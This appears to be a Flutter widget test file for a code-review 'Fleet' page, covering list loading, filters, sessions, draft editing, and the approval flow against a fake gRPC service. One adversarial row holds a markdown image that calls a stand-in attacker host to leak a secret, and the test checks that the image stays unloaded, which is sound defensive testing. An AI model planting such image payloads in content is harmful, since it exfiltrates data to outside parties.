import 'package:agent_portal/src/gen/agent/v1/review_fleet.pb.dart';
import 'package:fixnum/fixnum.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:grpc/grpc.dart';

import '../testkit/robots/fleet_robot.dart';
import 'fleet_spec.dart';

/// Layer-A widget tests for the Fleet page — iterates [fleetSpec]; each row is one
/// test. Covers the four list-load async states + a bare-gateway UNIMPLEMENTED
/// row, the filter bar, the sessions strip (Review-now dialog + enable toggle),
/// the detail pane (GetReview load / NotFound-unavailable / error-retry), the
/// edit/save flow with its dirty + locked gates, and the two mandatory
/// adversarial rows (exactly-one Approve on a double-click; inert remote image).
/// Each row arranges the fake, drives the page via its robot, then asserts the
/// recorded RPC (method + decoded request) and the widget outcome.
void main() {
  const listRpc = 'agent.v1.ReviewFleetService/ListReviews';
  const rosterRpc = 'agent.v1.ReviewFleetService/List';
  const getRpc = 'agent.v1.ReviewFleetService/GetReview';
  const approveRpc = 'agent.v1.ReviewFleetService/Approve';
  const updateRpc = 'agent.v1.ReviewFleetService/UpdateReview';
  const reviewNowRpc = 'agent.v1.ReviewFleetService/ReviewNow';
  const setEnabledRpc = 'agent.v1.ReviewFleetService/SetEnabled';

  ReviewSummary summary({
    String id = 'r1',
    String repo = 'owner__name',
    int pr = 7,
    String status = 'drafted',
    double risk = 0.42,
    int findings = 3,
  }) =>
      ReviewSummary(
        reviewId: id,
        repo: repo,
        prNumber: Int64(pr),
        status: status,
        riskScore: risk,
        nFindings: findings,
        filesChanged: 2,
        additions: 10,
        deletions: 1,
      );

  FleetSession session({
    String id = 's1',
    String repo = 'owner__name',
    bool enabled = false,
  }) =>
      FleetSession(id: id, repo: repo, enabled: enabled);

  ListReviewsReply reviews(List<ReviewSummary> rs) =>
      ListReviewsReply(reviews: rs);
  FleetSessionList roster(List<FleetSession> ss) => FleetSessionList(sessions: ss);
  GetReviewReply body(String b, {bool truncated = false}) =>
      GetReviewReply(body: b, truncated: truncated);

  for (final row in fleetSpec.rows) {
    testWidgets('fleet ${row.label} — ${row.description}', (tester) async {
      final robot = await FleetRobot.create(tester);
      final fake = robot.fleet;

      switch (row.label) {
        // ── list load: four async states + bare-gateway UNIMPLEMENTED ─────────
        case 'positive_loaded_lists_reviews':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.sessionListResponse = roster([session()]);
          await robot.load();
          expect(robot.isListLoaded, isTrue);
          expect(robot.reviewItemCount, greaterThanOrEqualTo(1));
          expect(robot.log.fired(listRpc), isTrue);
          expect(robot.log.fired(rosterRpc), isTrue);
          await robot.settle();

        case 'boundary_empty_list_no_items':
          fake.listReviewsResponse = reviews([]);
          await robot.load();
          expect(robot.isListLoaded, isTrue);
          expect(robot.reviewItemCount, 0);
          expect(robot.textShown('No review drafts match.'), isTrue);
          await robot.settle();

        case 'corner_loading_shows_spinner':
          fake.listReviewsResponse = reviews([summary()]);
          fake.responseDelay = const Duration(milliseconds: 200);
          await robot.pumpLoading();
          expect(robot.showsSpinner, isTrue);
          expect(robot.isListLoaded, isFalse);
          await robot.pumpUntil(() => robot.isListLoaded, reason: 'drain load');
          await robot.settle();

        case 'negative_list_error_shows_retry':
          fake.failNext('ListReviews', const GrpcError.unavailable('down'));
          await robot.load();
          expect(robot.isError, isTrue);
          await robot.settle();

        case 'negative_unimplemented_not_connected':
          fake.failNext('ListReviews'); // default UNIMPLEMENTED
          await robot.load();
          expect(robot.isError, isTrue);
          expect(robot.textShown('Not connected to the fleet'), isTrue);
          await robot.settle();

        case 'positive_retry_recovers':
          fake.failNext('ListReviews', const GrpcError.unavailable('down'));
          await robot.load();
          expect(robot.isError, isTrue);
          fake.listReviewsResponse = reviews([summary()]);
          await robot.tapRetry();
          expect(robot.isListLoaded, isTrue);
          await robot.settle();

        // ── filter bar ─────────────────────────────────────────────────────────
        case 'positive_filter_by_repo':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.submitRepo('acme__widgets');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).repo, 'acme__widgets');
          await robot.settle();

        case 'positive_filter_by_status':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.selectStatus('approved');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).status, 'approved');
          await robot.settle();

        case 'positive_refresh_relists':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.tapRefresh();
          expect(robot.log.countOf(listRpc), greaterThanOrEqualTo(2));
          await robot.settle();

        // ── sessions strip ──────────────────────────────────────────────────────
        case 'positive_review_now_opens_dialog':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          expect(robot.exists('fleet.reviewNow.prNumber'), isTrue);
          await robot.cancelReviewNow();
          await robot.settle();

        case 'positive_review_now_queues':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          fake.reviewNowResponse = ReviewNowReply()..accepted = true;
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('42');
          final call = robot.log.last(reviewNowRpc);
          final req = call!.request as ReviewNowRequest;
          expect(req.sessionId, 's1');
          expect(req.prNumber.toInt(), 42);
          await robot.settle();

        case 'positive_review_now_pr_field_sent':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          fake.reviewNowResponse = ReviewNowReply()..accepted = true;
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('123');
          final call = robot.log.last(reviewNowRpc);
          expect((call!.request as ReviewNowRequest).prNumber.toInt(), 123);
          await robot.settle();

        case 'positive_review_now_cancel_no_rpc':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.cancelReviewNow();
          expect(robot.exists('fleet.reviewNow.prNumber'), isFalse);
          expect(robot.log.fired(reviewNowRpc), isFalse);
          await robot.settle();

        case 'adversarial_review_now_non_numeric_no_rpc':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('not-a-number');
          expect(robot.log.fired(reviewNowRpc), isFalse);
          await robot.settle();

        case 'positive_toggle_enable':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1', enabled: false)]);
          fake.setEnabledResponse = FleetSession()
            ..id = 's1'
            ..enabled = true;
          await robot.load();
          await robot.expandSessions();
          await robot.toggleEnable('s1');
          final call = robot.log.last(setEnabledRpc);
          final req = call!.request as FleetSetEnabledRequest;
          expect(req.id, 's1');
          expect(req.enabled, isTrue);
          await robot.settle();

        // ── detail pane ──────────────────────────────────────────────────────────
        case 'positive_select_loads_detail':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Draft body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          final call = robot.log.last(getRpc);
          expect((call!.request as GetReviewRequest).reviewId, 'r1');
          await robot.settle();

        case 'corner_unavailable_body':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.notFound('no body here'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailUnavailable, isTrue);
          expect(robot.buttonEnabled('fleet.detail.approve'), isFalse);
          expect(robot.exists('fleet.detail.mode'), isFalse);
          await robot.settle();

        case 'negative_detail_error_shows_retry':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.unavailable('down'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailError, isTrue);
          await robot.settle();

        case 'positive_detail_retry_recovers':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.unavailable('down'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailError, isTrue);
          fake.getReviewResponse = body('# Recovered');
          await robot.tapDetailRetry();
          expect(robot.detailLoaded, isTrue);
          await robot.settle();

        case 'positive_switch_to_edit':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          expect(robot.exists('fleet.detail.editor'), isTrue);
          await robot.settle();

        case 'boundary_locked_disables_edit':
          fake.listReviewsResponse =
              reviews([summary(id: 'r1', status: 'posted')]);
          fake.getReviewResponse = body('# Posted body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.segmentEnabled('Edit'), isFalse);
          expect(robot.segmentEnabled('Preview'), isFalse);
          expect(robot.segmentEnabled('View'), isTrue);
          expect(robot.textShown('read-only'), isTrue);
          expect(robot.exists('fleet.detail.editor'), isFalse);
          await robot.settle();

        case 'positive_edit_updates_field':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('orig');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          await robot.editBody('edited body');
          expect(find.text('edited body').evaluate().isNotEmpty, isTrue);
          expect(robot.buttonEnabled('fleet.detail.save'), isTrue);
          await robot.settle();

        case 'positive_save_updates_review':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('orig');
          fake.updateReviewResponse = UpdateReviewReply()..status = 'updated';
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          await robot.editBody('new body');
          await robot.save();
          final call = robot.log.last(updateRpc);
          final req = call!.request as UpdateReviewRequest;
          expect(req.reviewId, 'r1');
          expect(req.body, 'new body');
          await robot.settle();

        case 'boundary_save_disabled_unless_dirty':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          expect(robot.buttonEnabled('fleet.detail.save'), isFalse);
          await robot.editBody('body changed');
          expect(robot.buttonEnabled('fleet.detail.save'), isTrue);
          await robot.settle();

        // ── approve ────────────────────────────────────────────────────────────
        case 'positive_approve_posts':
          fake.listReviewsResponse = reviews([summary(id: 'r1', pr: 7)]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()
            ..status = 'posted'
            ..detail = 'http://forge/pr/7#c1';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          expect(robot.exists('fleet.approve.confirm'), isTrue);
          await robot.confirmApprove();
          await robot.pumpUntil(() => robot.textShown('Posted'),
              reason: 'posted snack');
          final call = robot.log.last(approveRpc);
          expect((call!.request as ApproveRequest).reviewId, 'r1');
          await robot.settle();

        case 'positive_confirm_fires_approve':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()..status = 'posted';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          await robot.confirmApprove();
          expect(robot.log.fired(approveRpc), isTrue);
          await robot.settle();

        case 'positive_approve_cancel_no_rpc':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          await robot.cancelApprove();
          expect(robot.exists('fleet.approve.confirm'), isFalse);
          expect(robot.log.fired(approveRpc), isFalse);
          await robot.settle();

        case 'boundary_approve_gated_when_dirty':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.buttonEnabled('fleet.detail.approve'), isTrue);
          await robot.selectMode('Edit');
          await robot.editBody('dirty change');
          expect(robot.buttonEnabled('fleet.detail.approve'), isFalse);
          await robot.settle();

        case 'adversarial_double_click_one_approve':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()..status = 'posted';
          await robot.load();
          await robot.selectReview('r1');
          fake.responseDelay = const Duration(milliseconds: 200); // hold in flight
          await robot.openApprove();
          await robot.doubleConfirmApprove();
          expect(robot.log.countOf(approveRpc), 1);
          fake.responseDelay = Duration.zero;
          await robot.unmountAndSettle();

        case 'adversarial_remote_image_is_inert':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body(
              '![tracker](http://attacker.example/track.png?leak=secret)');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          expect(robot.textShown('image not loaded'), isTrue);
          await robot.settle();

        default:
          fail('no test body for row ${row.label}');
      }
    });
  }
}
